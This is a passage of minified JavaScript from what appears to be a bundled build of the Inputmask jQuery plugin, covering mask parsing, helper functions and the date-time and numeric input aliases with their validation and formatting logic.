this.opts[t] : "object" === (void 0 === t ? "undefined" : At(t)) ? (at.extend(this.userOptions, t), this.el && !0 !== e && this.mask(this.el), this) : void 0 }, unmaskedvalue: function (t) { return this.maskset = this.maskset || a(this.opts, this.noMasksCache), Ct.call(this, { action: "unmaskedvalue", value: t }) }, remove: function () { return Ct.call(this, { action: "remove" }) }, getemptymask: function () { return this.maskset = this.maskset || a(this.opts, this.noMasksCache), Ct.call(this, { action: "getemptymask" }) }, hasMaskedValue: function () { return !this.opts.autoUnmask }, isComplete: function () { return this.maskset = this.maskset || a(this.opts, this.noMasksCache), Ct.call(this, { action: "isComplete" }) }, getmetadata: function () { return this.maskset = this.maskset || a(this.opts, this.noMasksCache), Ct.call(this, { action: "getmetadata" }) }, isValid: function (t) { return this.maskset = this.maskset || a(this.opts, this.noMasksCache), Ct.call(this, { action: "isValid", value: t }) }, format: function (t, e) { return this.maskset = this.maskset || a(this.opts, this.noMasksCache), Ct.call(this, { action: "format", value: t, metadata: e }) }, setValue: function (t) { this.el && at(this.el).trigger("setvalue", [t]) }, analyseMask: function (t, a, s) { var e, n, i, o = /(?:[?*+]|\{[0-9\+\*]+(?:,[0-9\+\*]*)?(?:\|[0-9\+\*]*)?\})|[^.?*+^${[]()|\\]+|./g, r = /\[\^?]?(?:[^\\\]]+|\\[\S\s]?)*]?|\\(?:0(?:[0-3][0-7]{0,2}|[4-7][0-7]?)?|[1-9][0-9]*|x[0-9A-Fa-f]{2}|u[0-9A-Fa-f]{4}|c[A-Za-z]|[\S\s]?)|\((?:\?[:=!]?)?|(?:[?*+]|\{[0-9]+(?:,[0-9]*)?\})\??|[^.?*+^${[()|\\]+|./g, g = !1, l = new u, c = [], I = []; function u(t, e, n, i) { this.matches = [], this.openGroup = t || !1, this.alternatorGroup = !1, this.isGroup = t || !1, this.isOptional = e || !1, this.isQuantifier = n || !1, this.isAlternator = i || !1, this.quantifier = { min: 1, max: 1 } } function h(n, t, i) { i = i !== rt ? i : n.matches.length; var e, o = n.matches[i - 1]; a ? (0 === t.indexOf("[") || g && /\\d|\\s|\\w]/i.test(t) || "." === t ? n.matches.splice(i++, 0, { fn: new RegExp(t, s.casing ? "i" : ""), optionality: !1, newBlockMarker: o === rt ? "master" : o.def !== t, casing: null, def: t, placeholder: rt, nativeDef: t }) : (g && (t = t[t.length - 1]), at.each(t.split(""), function (t, e) { o = n.matches[i - 1], n.matches.splice(i++, 0, { fn: null, optionality: !1, newBlockMarker: o === rt ? "master" : o.def !== e && null !== o.fn, casing: null, def: s.staticDefinitionSymbol || e, placeholder: s.staticDefinitionSymbol !== rt ? e : rt, nativeDef: (g ? "'" : "") + e }) })), g = !1) : (e = (s.definitions ? s.definitions[t] : rt) || ht.prototype.definitions[t]) && !g ? n.matches.splice(i++, 0, { fn: e.validator ? "string" == typeof e.validator ? new RegExp(e.validator, s.casing ? "i" : "") : new function () { this.test = e.validator } : new RegExp("."), optionality: !1, newBlockMarker: o === rt ? "master" : o.def !== (e.definitionSymbol || t), casing: e.casing, def: e.definitionSymbol || t, placeholder: e.placeholder, nativeDef: t }) : (n.matches.splice(i++, 0, { fn: null, optionality: !1, newBlockMarker: o === rt ? "master" : o.def !== t && null !== o.fn, casing: null, def: s.staticDefinitionSymbol || t, placeholder: s.staticDefinitionSymbol !== rt ? t : rt, nativeDef: (g ? "'" : "") + t }), g = !1) } function d() { if (0 < c.length) { if (h(n = c[c.length - 1], p), n.isAlternator) { i = c.pop(); for (var t = 0; t < i.matches.length; t++)i.matches[t].isGroup && (i.matches[t].isGroup = !1); 0 < c.length ? (n = c[c.length - 1]).matches.push(i) : l.matches.push(i) } } else h(l, p) } function C(t) { var e = new u(!0); return e.openGroup = !1, e.matches = t, e } for (a && (s.optionalmarker[0] = rt, s.optionalmarker[1] = rt); F = a ? r.exec(t) : o.exec(t);) { if (p = F[0], a) switch (p.charAt(0)) { case "?": p = "{0,1}"; break; case "+": case "*": p = "{" + p + "}" }if (g) d(); else switch (p.charAt(0)) { case "(?=": case "(?!": case "(?<=": case "(?<!": break; case s.escapeChar: g = !0, a && d(); break; case s.optionalmarker[1]: case s.groupmarker[1]: if ((e = c.pop()).openGroup = !1, e !== rt) if (0 < c.length) { if ((n = c[c.length - 1]).matches.push(e), n.isAlternator) { i = c.pop(); for (var A = 0; A < i.matches.length; A++)i.matches[A].isGroup = !1, i.matches[A].alternatorGroup = !1; 0 < c.length ? (n = c[c.length - 1]).matches.push(i) : l.matches.push(i) } } else l.matches.push(e); else d(); break; case s.optionalmarker[0]: c.push(new u(!1, !0)); break; case s.groupmarker[0]: c.push(new u(!0)); break; case s.quantifiermarker[0]: var p, m = new u(!1, !1, !0), f = (p = p.replace(/[{}]/g, "")).split("|"), b = f[0].split(","), B = isNaN(b[0]) ? b[0] : parseInt(b[0]), y = 1 === b.length ? B : isNaN(b[1]) ? b[1] : parseInt(b[1]); "*" !== B && "+" !== B || (B = "*" === y ? 0 : 1), m.quantifier = { min: B, max: y, jit: f[1] }; var v, x, F, Q = 0 < c.length ? c[c.length - 1].matches : l.matches; (F = Q.pop()).isAlternator && (Q.push(F), Q = F.matches, v = new u(!0), x = Q.pop(), Q.push(v), Q = v.matches, F = x), F.isGroup || (F = C([F])), Q.push(F), Q.push(m); break; case s.alternatormarker: var G, w, X, S = function (t) { var e = t.pop(); return e.isQuantifier && (e = C([t.pop(), e])), e }; (w = 0 < c.length ? (G = (n = c[c.length - 1]).matches[n.matches.length - 1], n.openGroup && (G.matches === rt || !1 === G.isGroup && !1 === G.isAlternator) ? c.pop() : S(n.matches)) : S(l.matches)).isAlternator ? c.push(w) : (w.alternatorGroup ? (i = c.pop(), w.alternatorGroup = !1) : i = new u(!1, !1, !1, !0), i.matches.push(w), c.push(i), w.openGroup && ((X = new u(!(w.openGroup = !1))).alternatorGroup = !0, c.push(X))); break; default: d() } } for (; 0 < c.length;)e = c.pop(), l.matches.push(e); return 0 < l.matches.length && (function i(o) { o && o.matches && at.each(o.matches, function (t, e) { var n = o.matches[t + 1]; (n === rt || n.matches === rt || !1 === n.isQuantifier) && e && e.isGroup && (e.isGroup = !1, a || (h(e, s.groupmarker[0], 0), !0 !== e.openGroup && h(e, s.groupmarker[1]))), i(e) }) }(l), I.push(l)), (s.numericInput || s.isRTL) && function t(e) { for (var n in e.matches = e.matches.reverse(), e.matches) { var i, o; e.matches.hasOwnProperty(n) && (i = parseInt(n), e.matches[n].isQuantifier && e.matches[i + 1] && e.matches[i + 1].isGroup && (o = e.matches[n], e.matches.splice(n, 1), e.matches.splice(i + 1, 0, o)), e.matches[n].matches !== rt ? e.matches[n] = t(e.matches[n]) : e.matches[n] = ((a = e.matches[n]) === s.optionalmarker[0] ? a = s.optionalmarker[1] : a === s.optionalmarker[1] ? a = s.optionalmarker[0] : a === s.groupmarker[0] ? a = s.groupmarker[1] : a === s.groupmarker[1] && (a = s.groupmarker[0]), a)) } var a; return e }(I[0]), I }, positionColorMask: function (t, e) { t.style.left = e.offsetLeft + "px" } }, ht.extendDefaults = function (t) { at.extend(!0, ht.prototype.defaults, t) }, ht.extendDefinitions = function (t) { at.extend(!0, ht.prototype.definitions, t) }, ht.extendAliases = function (t) { at.extend(!0, ht.prototype.aliases, t) }, ht.format = function (t, e, n) { return ht(e).format(t, n) }, ht.unmask = function (t, e) { return ht(e).unmaskedvalue(t) }, ht.isValid = function (t, e) { return ht(e).isValid(t) }, ht.remove = function (t) { "string" == typeof t && (t = gt.getElementById(t) || gt.querySelectorAll(t)), t = t.nodeName ? [t] : t, at.each(t, function (t, e) { e.inputmask && e.inputmask.remove() }) }, ht.setValue = function (t, n) { "string" == typeof t && (t = gt.getElementById(t) || gt.querySelectorAll(t)), t = t.nodeName ? [t] : t, at.each(t, function (t, e) { e.inputmask ? e.inputmask.setValue(n) : at(e).trigger("setvalue", [n]) }) }, ht.escapeRegex = function (t) { return t.replace(new RegExp("(\\" + ["/", ".", "*", "+", "?", "|", "(", ")", "[", "]", "{", "}", "\\", "$", "^"].join("|\\") + ")", "gim"), "\\$1") }, ht.keyCode = { BACKSPACE: 8, BACKSPACE_SAFARI: 127, DELETE: 46, DOWN: 40, END: 35, ENTER: 13, ESCAPE: 27, HOME: 36, INSERT: 45, LEFT: 37, PAGE_DOWN: 34, PAGE_UP: 33, RIGHT: 39, SPACE: 32, TAB: 9, UP: 38, X: 88, CONTROL: 17 }, ht.dependencyLib = at, ht }) ? i.apply(e, o) : i) || (t.exports = a) }, function (t, e, n) { "use strict"; var i, o, a; o = [n(4)], void 0 === (a = "function" == typeof (i = function (t) { return t }) ? i.apply(e, o) : i) || (t.exports = a) }, function (t, e) { t.exports = jQuery }, function (module, exports, __webpack_require__) { "use strict"; var __WEBPACK_AMD_DEFINE_RESULT__, _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }, __WEBPACK_AMD_DEFINE_RESULT__ = function () { return "undefined" != typeof window ? window : new (eval("require('jsdom').JSDOM"))("").window }.call(exports, __webpack_require__, exports, module); void 0 === __WEBPACK_AMD_DEFINE_RESULT__ || (module.exports = __WEBPACK_AMD_DEFINE_RESULT__) }, function (t, e, n) { "use strict"; var i, o, a, d = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }; o = [n(2)], void 0 === (a = "function" == typeof (i = function (r) { var g = r.dependencyLib, u = { d: ["[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", Date.prototype.getDate], dd: ["0[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", function () { return c(Date.prototype.getDate.call(this), 2) }], ddd: [""], dddd: [""], m: ["[1-9]|1[012]", Date.prototype.setMonth, "month", function () { return Date.prototype.getMonth.call(this) + 1 }], mm: ["0[1-9]|1[012]", Date.prototype.setMonth, "month", function () { return c(Date.prototype.getMonth.call(this) + 1, 2) }], mmm: [""], mmmm: [""], yy: ["[0-9]{2}", Date.prototype.setFullYear, "year", function () { return c(Date.prototype.getFullYear.call(this), 2) }], yyyy: ["[0-9]{4}", Date.prototype.setFullYear, "year", function () { return c(Date.prototype.getFullYear.call(this), 4) }], h: ["[1-9]|1[0-2]", Date.prototype.setHours, "hours", Date.prototype.getHours], hh: ["0[1-9]|1[0-2]", Date.prototype.setHours, "hours", function () { return c(Date.prototype.getHours.call(this), 2) }], hhh: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours], H: ["1?[0-9]|2[0-3]", Date.prototype.setHours, "hours", Date.prototype.getHours], HH: ["0[0-9]|1[0-9]|2[0-3]", Date.prototype.setHours, "hours", function () { return c(Date.prototype.getHours.call(this), 2) }], HHH: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours], M: ["[1-5]?[0-9]", Date.prototype.setMinutes, "minutes", Date.prototype.getMinutes], MM: ["0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]", Date.prototype.setMinutes, "minutes", function () { return c(Date.prototype.getMinutes.call(this), 2) }], ss: ["[0-5][0-9]", Date.prototype.setSeconds, "seconds", function () { return c(Date.prototype.getSeconds.call(this), 2) }], l: ["[0-9]{3}", Date.prototype.setMilliseconds, "milliseconds", function () { return c(Date.prototype.getMilliseconds.call(this), 3) }], L: ["[0-9]{2}", Date.prototype.setMilliseconds, "milliseconds", function () { return c(Date.prototype.getMilliseconds.call(this), 2) }], t: ["[ap]"], tt: ["[ap]m"], T: ["[AP]"], TT: ["[AP]M"], Z: [""], o: [""], S: [""] }, e = { isoDate: "yyyy-mm-dd", isoTime: "HH:MM:ss", isoDateTime: "yyyy-mm-dd'T'HH:MM:ss", isoUtcDateTime: "UTC:yyyy-mm-dd'T'HH:MM:ss'Z'" }; function h(t) { if (!t.tokenizer) { var e = []; for (var n in u) { if (e.indexOf(n[0]) === -1) e.push(n[0]) } t.tokenizer = "(" + e.join("+|") + ")+?|."; t.tokenizer = new RegExp(t.tokenizer, "g") } return t.tokenizer } function t(t, e) { return (!isFinite(t.rawday) || "29" == t.day && !isFinite(t.rawyear) || new Date(t.date.getFullYear(), isFinite(t.rawmonth) ? t.month : t.date.getMonth() + 1, 0).getDate() >= t.day) && e } function n(t, e) { var n = !0; if (e.min) { var i, o; t.rawyear && (i = t.rawyear.replace(/[^0-9]/g, ""), o = e.min.year.substr(0, i.length), n = o <= i), t.year === t.rawyear && e.min.date.getTime() === e.min.date.getTime() && (n = e.min.date.getTime() <= t.date.getTime()) } if (n && e.max && e.max.date.getTime() === e.max.date.getTime()) n = e.max.date.getTime() >= t.date.getTime(); return n } function l(t, e, n, i) { var o = "", a; while (a = h(n).exec(t)) { if (e === undefined) { if (u[a[0]]) { o += "(" + u[a[0]][0] + ")" } else { switch (a[0]) { case "[": o += "("; break; case "]": o += ")?"; break; default: o += r.escapeRegex(a[0]) } } } else { if (u[a[0]]) { if (i !== true && u[a[0]][3]) { var s = u[a[0]][3]; o += s.call(e.date) } else if (u[a[0]][2]) o += e["raw" + u[a[0]][2]]; else o += a[0] } else o += a[0] } } return o } function c(t, e) { t = String(t); e = e || 2; while (t.length < e) { t = "0" + t } return t } function I(t, e, a) { var n = { date: new Date(1, 0, 1) }, s, i = t, o, r, g; function l(t) { var e = t.replace(/[^0-9]/g, "0"); if (e != t) { var n = t.replace(/[^0-9]/g, ""), i = (a.min && a.min[s] || t).toString(), o = (a.max && a.max[s] || t).toString(); e = n + (n < i.slice(0, n.length) ? i.slice(n.length) : n > o.slice(0, n.length) ? o.slice(n.length) : e.toString().slice(n.length)) } return e } function c(t, e, n) { t[s] = l(e); t["raw" + s] = e; if (r !== undefined) r.call(t.date, s == "month" ? parseInt(t[s]) - 1 : t[s]) } if (typeof i === "string") { while (o = h(a).exec(e)) { var I = i.slice(0, o[0].length); if (u.hasOwnProperty(o[0])) { g = u[o[0]][0]; s = u[o[0]][2]; r = u[o[0]][1]; c(n, I, a) } i = i.slice(I.length) } return n } else if (i && (typeof i === "undefined" ? "undefined" : d(i)) === "object" && i.hasOwnProperty("date")) { return i } return undefined } return r.extendAliases({ datetime: { mask: function (t) { return u.S = t.i18n.ordinalSuffix.join("|"), t.inputFormat = e[t.inputFormat] || t.inputFormat, t.displayFormat = e[t.displayFormat] || t.displayFormat || t.inputFormat, t.outputFormat = e[t.outputFormat] || t.outputFormat || t.inputFormat, t.placeholder = "" !== t.placeholder ? t.placeholder : t.inputFormat.replace(/[\[\]]/, ""), t.regex = l(t.inputFormat, void 0, t), null }, placeholder: "", inputFormat: "isoDateTime", displayFormat: void 0, outputFormat: void 0, min: null, max: null, i18n: { dayNames: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"], monthNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"], ordinalSuffix: ["st", "nd", "rd", "th"] }, postValidation: function (t, e, n, i) { i.min = I(i.min, i.inputFormat, i), i.max = I(i.max, i.inputFormat, i); var o, a, s = n, r = I(t.join(""), i.inputFormat, i); return s && r.date.getTime() === r.date.getTime() && (o = r, a = s, s = (s = (!isFinite(o.rawday) || "29" == o.day && !isFinite(o.rawyear) || new Date(o.date.getFullYear(), isFinite(o.rawmonth) ? o.month : o.date.getMonth() + 1, 0).getDate() >= o.day) && a) && function (t, e) { var n = !0; { var i, o; e.min && (t.rawyear && (i = t.rawyear.replace(/[^0-9]/g, ""), o = e.min.year.substr(0, i.length), n = o <= i), t.year === t.rawyear && e.min.date.getTime() === e.min.date.getTime() && (n = e.min.date.getTime() <= t.date.getTime())) } n && e.max && e.max.date.getTime() === e.max.date.getTime() && (n = e.max.date.getTime() >= t.date.getTime()); return n }(r, i)), e && s && n.pos !== e ? { buffer: l(i.inputFormat, r, i), refreshFromBuffer: { start: e, end: n.pos } } : s }, onKeyDown: function (t, e, n, i) { if (t.ctrlKey && t.keyCode === r.keyCode.RIGHT) { for (var o, a = new Date, s = ""; o = h(i).exec(i.inputFormat);)"d" === o[0].charAt(0) ? s += c(a.getDate(), o[0].length) : "m" === o[0].charAt(0) ? s += c(a.getMonth() + 1, o[0].length) : "yyyy" === o[0] ? s += a.getFullYear().toString() : "y" === o[0].charAt(0) && (s += c(a.getYear(), o[0].length)); this.inputmask._valueSet(s), g(this).trigger("setvalue") } }, onUnMask: function (t, e, n) { return l(n.outputFormat, I(t, n.inputFormat, n), n, !0) }, casing: function (t, e) { return 0 == e.nativeDef.indexOf("[ap]") ? t.toLowerCase() : 0 == e.nativeDef.indexOf("[AP]") ? t.toUpperCase() : t }, insertMode: !1, shiftPositions: !1 } }), r }) ? i.apply(e, o) : i) || (t.exports = a) }, function (t, e, n) { "use strict"; var i, o, a; o = [n(2)], void 0 === (a = "function" == typeof (i = function (b) { var B = b.dependencyLib; function s(t, e) { var n = ""; for (var i = 0; i < t.length; i++) { if (b.prototype.definitions[t.charAt(i)] || e.definitions[t.charAt(i)] || e.optionalmarker.start === t.charAt(i) || e.optionalmarker.end === t.charAt(i) || e.quantifiermarker.start === t.charAt(i) || e.quantifiermarker.end === t.charAt(i) || e.groupmarker.start === t.charAt(i) || e.groupmarker.end === t.charAt(i) || e.alternatormarker === t.charAt(i)) { n += "\\" + t.charAt(i) } else n += t.charAt(i) } return n } function t(t, e, n) { if (0 < e) { var i = B.inArray(n.radixPoint, t); -1 === i && (t.push(n.radixPoint), i = t.length - 1); for (var o = 1; o <= e; o++)t[i + o] = t[i + o] || "0" } return t } return b.extendAliases({ numeric: { mask: function (t) { var e, n; 0 !== t.repeat && isNaN(t.integerDigits) && (t.integerDigits = t.repeat), t.repeat = 0, t.groupSeparator === t.radixPoint && t.digits && "0" !== t.digits && ("." === t.radixPoint ? t.groupSeparator = "," : "," === t.radixPoint ? t.groupSeparator = "." : t.groupSeparator = ""), " " === t.groupSeparator && (t.skipOptionalPartCharacter = void 0), t.autoGroup = t.autoGroup && "" !== t.groupSeparator, t.autoGroup && ("string" == typeof t.groupSize && isFinite(t.groupSize) && (t.groupSize = parseInt(t.groupSize)), isFinite(t.integerDigits) && (e = Math.floor(t.integerDigits / t.groupSize), n = t.integerDigits % t.groupSize, t.integerDigits = parseInt(t.integerDigits) + (0 == n ? e - 1 : e), t.integerDigits < 1 && (t.integerDigits = "*"))), 1 < t.placeholder.length && (t.placeholder = t.placeholder.charAt(0)), "radixFocus" === t.positionCaretOnClick && "" === t.placeholder && !1 === t.integerOptional && (t.positionCaretOnClick = "lvp"), t.definitions[";"] = t.definitions["~"], t.definitions[";"].definitionSymbol = "~", !0 === t.numericInput && (t.positionCaretOnClick = "radixFocus" === t.positionCaretOnClick ? "lvp" : t.positionCaretOnClick, t.digitsOptional = !1, isNaN(t.digits) && (t.digits = 2), t.decimalProtect = !1); var i, o, a = "[+]"; return a += s(t.prefix, t), !0 === t.integerOptional ? a += "~{1," + t.integerDigits + "}" : a += "~{" + t.integerDigits + "}", void 0 !== t.digits && (i = t.decimalProtect ? ":" : t.radixPoint, o = t.digits.toString().split(","), isFinite(o[0]) && o[1] && isFinite(o[1]) ? a += i + ";{" + t.digits + "}" : (isNaN(t.digits) || 0 < parseInt(t.digits)) && (t.digitsOptional ? a += "[" + i + ";{1," + t.digits + "}]" : a += i + ";{" + t.digits + "}")), a += s(t.suffix, t), a += "[-]", t.greedy = !1, a }, placeholder: "", greedy: !1, digits: "*", digitsOptional: !0, enforceDigitsOnBlur: !1, radixPoint: ".", positionCaretOnClick: "radixFocus", groupSize: 3, groupSeparator: "", autoGroup: !1, allowMinus: !0, negationSymbol: { front: "-", back: "" }, integerDigits: "+", integerOptional: !0, prefix: "", suffix: "", rightAlign: !0, decimalProtect: !0, min: null, max: null, step: 1, insertMode: !0, autoUnmask: !1, unmaskAsNumber: !1, inputType: "text", inputmode: "numeric", preValidation: function (t, e, n, i, o, a) { if ("-" === n || n === o.negationSymbol.front) return !0 === o.allowMinus && (o.isNegative = void 0 === o.isNegative || !o.isNegative, "" === t.join("") || { caret: a.validPositions[e] ? e : void 0, dopost: !0 }); if (!1 === i && n === o.radixPoint && void 0 !== o.digits && (isNaN(o.digits) || 0 < parseInt(o.digits))) { var s = B.inArray(o.radixPoint, t); if (-1 !== s && void 0 !== a.validPositions[s]) return !0 === o.numericInput ? e === s : { caret: s + 1 } } return !0 }, postValidation: function (t, e, n, i) { var o = i.suffix.split(""), a = i.prefix.split(""); if (void 0 === n.pos && void 0 !== n.caret && !0 !== n.dopost) return n; var s = void 0 !== n.caret ? n.caret : n.pos, r = t.slice(); i.numericInput && (s = r.length - s - 1, r = r.reverse()); var g = r[s]; if (g === i.groupSeparator && (g = r[s += 1]), s === r.length - i.suffix.length - 1 && g === i.radixPoint) return n; void 0 !== g && g !== i.radixPoint && g !== i.negationSymbol.front && g !== i.negationSymbol.back && (r[s] = "?", 0 < i.prefix.length && s >= (!1 === i.isNegative ? 1 : 0) && s < i.prefix.length - 1 + (!1 === i.isNegative ? 1 : 0) ? a[s - (!1 === i.isNegative ? 1 : 0)] = "?" : 0 < i.suffix.length && s >= r.length - i.suffix.length - (!1 === i.isNegative ? 1 : 0) && (o[s - (r.length - i.suffix.length - (!1 === i.isNegative ? 1 : 0))] = "?")), a = a.join(""), o = o.join(""); var l, c, I, u, h, d, C = r.join("").replace(a, ""); if (C = (C = (C = (C = C.replace(o, "")).replace(new RegExp(b.escapeRegex(i.groupSeparator), "g"), "")).replace(new RegExp("[-" + b.escapeRegex(i.negationSymbol.front) + "]", "g"), "")).replace(new RegExp(b.escapeRegex(i.negationSymbol.back) + "$"), ""), isNaN(i.placeholder) && (C = C.replace(new RegExp(b.escapeRegex(i.placeholder), "g"), "")), 1 < C.length && 1 !== C.indexOf(i.radixPoint) && ("0" === g && (C = C.replace(/^\?/g, "")), C = C.replace(/^0/g, "")), C.charAt(0) === i.radixPoint && "" !== i.radixPoint && !0 !== i.numericInput && (C = "0" + C), "" !== C) { if (C = C.split(""), (!i.digitsOptional || i.enforceDigitsOnBlur && "blur" === n.event) && isFinite(i.digits)) { var A = B.inArray(i.radixPoint, C), p = B.inArray(i.radixPoint, r); -1 === A && (C.push(i.radixPoint), A = C.length - 1); for (var m = 1; m <= i.digits; m++)i.digitsOptional && (!i.enforceDigitsOnBlur || "blur" !== n.event) || void 0 !== C[A + m] && C[A + m] !== i.placeholder.charAt(0) ? -1 !== p && void 0 !== r[p + m] && (C[A + m] = C[A + m] || r[p + m]) : C[A + m] = n.placeholder || i.placeholder.charAt(0) } !0 !== i.autoGroup || "" === i.groupSeparator || g === i.radixPoint && void 0 === n.pos && !n.dopost ? C = C.join("") : (l = C[C.length - 1] === i.radixPoint && n.c === i.radixPoint, C = b((c = C, h = "", h += "(" + (I = i).groupSeparator + "*{" + I.groupSize + "}){*}", "" === I.radixPoint || (u = c.join("").split(I.radixPoint))[1] && (h += I.radixPoint + "*{" + u[1].match(/^\d*\??\d*/)[0].length + "}"), h), { numericInput: !0, jitMasking: !0, definitions: { "*": { validator: "[0-9?]", cardinality: 1 } } }).format(C.join("")), l && (C += i.radixPoint), C.charAt(0) === i.groupSeparator && C.substr(1)) } i.isNegative && "blur" === n.event && (i.isNegative = "0" !== C), C = a + C, C += o, i.isNegative && (C = i.negationSymbol.front + C, C += i.negationSymbol.back), C = C.split(""), void 0 !== g && (g !== i.radixPoint && g !== i.negationSymbol.front && g !== i.negationSymbol.back ? -1 < (s = B.inArray("?", C)) ? C[s] = g : s = n.caret || 0 : g !== i.radixPoint && g !== i.negationSymbol.front && g !== i.negationSymbol.back || -1 !== (d = B.inArray(g, C)) && (s = d)), i.numericInput && (s = C.length - s - 1, C = C.reverse()); var f = { caret: void 0 !== g && void 0 === n.pos || void 0 === s ? s : s + (i.numericInput ? -1 : 1), buffer: C, refreshFromBuffer: n.dopost || t.join("") !== C.join("") }; return f.refreshFromBuffer ? f : n }, onBeforeWrite: function (t, e, n, i) { if (t) switch (t.type) { case "keydown": return i.postValidation(e, n, { caret: n, dopost: !0 }, i); case "blur": case "checkval": var o; if (void 0 === (a = i).parseMinMaxOptions && (null !== a.min && (a.min = a.min.toString().replace(new RegExp(b.escapeRegex(a.groupSeparator), "g"), ""), "," === a.radixPoint && (a.min = a.min.replace(a.radixPoint, ".")), a.min = isFinite(a.min) ? parseFloat(a.min) : NaN, isNaN(a.min) && (a.min = Number.MIN_VALUE)), null !== a.max && (a.max = a.max.toString().replace(new RegExp(b.escapeRegex(a.groupSeparator), "g"), ""), "," === a.radixPoint && (a.max = a.max.replace(a.radixPoint, ".")), a.max = isFinite(a.max) ? parseFloat(a.max) : NaN, isNaN(a.max) && (a.max = Number.MAX_VALUE)), a.parseMinMaxOptions = "done"), null !== i.min || null !== i.max) { if (o = i.onUnMask(e.join(""), void 0, B.extend({}, i, { unmaskAsNumber: !0 })), null !== i.min && o < i.min) return i.isNegative = i.min < 0, i.postValidation(i.min.toString().replace(".", i.radixPoint).split(""), n, { caret: n, dopost: !0, placeholder: "0" }, i); if (null !== i.max && o > i.max) return i.isNegative = i.max < 0, i.postValidation(i.max.toString().replace(".", i.radixPoint).split(""), n, { caret: n, dopost: !0, placeholder: "0" }, i) } return i.postValidation(e, n, { caret: n, placeholder: "0", event: "blur" }, i); case "_checkval": return { caret: n } }var a }, regex: { integerPart: function (t, e) { return e ? new RegExp("[" + b.escapeRegex(t.negationSymbol.front) + "+]?") : new RegExp("[" + b.escapeRegex(t.negationSymbol.front) + "+]?\\d+") }, integerNPart: function (t) { return new RegExp("[\\d" + b.escapeRegex(t.groupSeparator) + b.escapeRegex(t.placeholder.charAt(0)) + "]+") } }, definitions: { "~": { validator: function (t, e, n, i, o, a) { var s; if ("k" === t || "m" === t) { s = { insert: [], c: 0 }; for (var r = 0, g = "k" === t ? 2 : 5; r < g; r++)s.insert.push({ pos: n + r, c: 0 }); return s.pos = n + g, s } if (!0 === (s = i ? new RegExp("[0-9" + b.escapeRegex(o.groupSeparator) + "]").test(t) : new RegExp("[0-9]").test(t))) { if (!0 !== o.numericInput && void 0 !== e.validPositions[n] && "~" === e.validPositions[n].match.def && !a) { var l = e.buffer.join(""), c = (l = (l = l.replace(new RegExp("[-" + b.escapeRegex(o.negationSymbol.front) + "]", "g"), "")).replace(new RegExp(b.escapeRegex(o.negationSymbol.back) + "$"), "")).split(o.radixPoint); 1 < c.length && (c[1] = c[1].replace(/0/g, o.placeholder.charAt(0))), "0" === c[0] && (c[0] = c[0].replace(/0/g, o.placeholder.charAt(0))), l = c[0] + o.radixPoint + c[1] || ""; var I = e._buffer.join(""); for (l === o.radixPoint && (l = I); null === l.match(b.escapeRegex(I) + "$");)I = I.slice(1); s = void 0 === (l = (l = l.replace(I, "")).split(""))[n] ? { pos: n, remove: n } : { pos: n } } } else i || t !== o.radixPoint || void 0 !== e.validPositions[n - 1] || (s = { insert: { pos: n, c: 0 }, pos: n + 1 }); return s }, cardinality: 1 }, "+": { validator: function (t, e, n, i, o) { return o.allowMinus && ("-" === t || t === o.negationSymbol.front) }, cardinality: 1, placeholder: "" }, "-": { validator: function (t, e, n, i, o) { return o.allowMinus && t === o.negationSymbol.back }, cardinality: 1, placeholder: "" }, ":": { validator: function (t, e, n, i, o) { var a = "[" + b.escapeRegex(o.radixPoint) + "]", s = new RegExp(a).test(t); return s && e.validPositions[n] && e.validPositions[n].match.placeholder === o.radixPoint && (s = { caret: n + 1 }), s }, cardinality: 1, placeholder: function (t) { return t.radixPoint } } }, onUnMask: function (t, e, n) { if ("" === e && !0 === n.nullable) return e; var i = t.replace(n.prefix, ""); return i = (i = i.replace(n.suffix, "")).replace(new RegExp(b.escapeRegex(n.groupSeparator), "g"), ""), "" !== n.placeholder.charAt(0) && (i = i.replace(new RegExp(n.placeholder.charAt(0), "g"), "0")), n.unmaskAsNumber ? ("" !== n.radixPoint && -1 !== i.indexOf(n.radixPoint) && (i = i.replace(b.escapeRegex.call(this, n.radixPoint), ".")), i = (i = i.replace(new RegExp("^" + b.escapeRegex(n.negationSymbol.front)), "-")).replace(new RegExp(b.escapeRegex(n.negationSymbol.back) + "$"), ""), Number(i)) : i }, isComplete: function (t, e) { var n = (e.numericInput ? t.slice().reverse() : t).join(""); return n = (n = (n = (n = (n = n.replace(new RegExp("^" + b.escapeRegex(e.negationSymbol.front)), "-")).replace(new RegExp(b.escapeRegex(e.negationSymbol.back) + "$"), "")).replace(e.prefix, "")).replace(e.suffix, "")).replace(new RegExp(b.escapeRegex(e.groupSeparator) + "([0-9]{3})", "g"), "$1"), "," === e.radixPoint && (n = n.replace(b.escapeRegex(e.radixPoint), ".")), isFinite(n) }, onBeforeMask: function (t, e) { e.isNegative = void 0; var n = e.radixPoint || ","; "number" != typeof t && "number" !== e.inputType || "" === n || (t = t.toString().replace(".", n)); var i = t.split(n), o = i[0].replace(/[^\-0-9]/g, ""), a = 1 < i.length ? i[1].replace(/[^0-9]/g, "") : ""; t = o + ("" !== a ? n + a : a); var s, r = 0; return "" !== n && (r = a.length, "" !== a && (s = Math.pow(10, r || 1), isFinite(e.digits) && (r = parseInt(e.digits), s = Math.pow(10, r)), t = t.replace(b.escapeRegex(n), "."), isFinite(t) && (t = Math.round(parseFloat(t) * s) / s), t = t.toString().replace(".", n))), 0 === e.digits && -1 !== t.indexOf(b.escapeRegex(n)) && (t = t.substring(0, t.indexOf(b.escapeRegex(n)))), function (t, e, n) { if (0 < e) { var i = B.inArray(n.radixPoint, t); -1 === i && 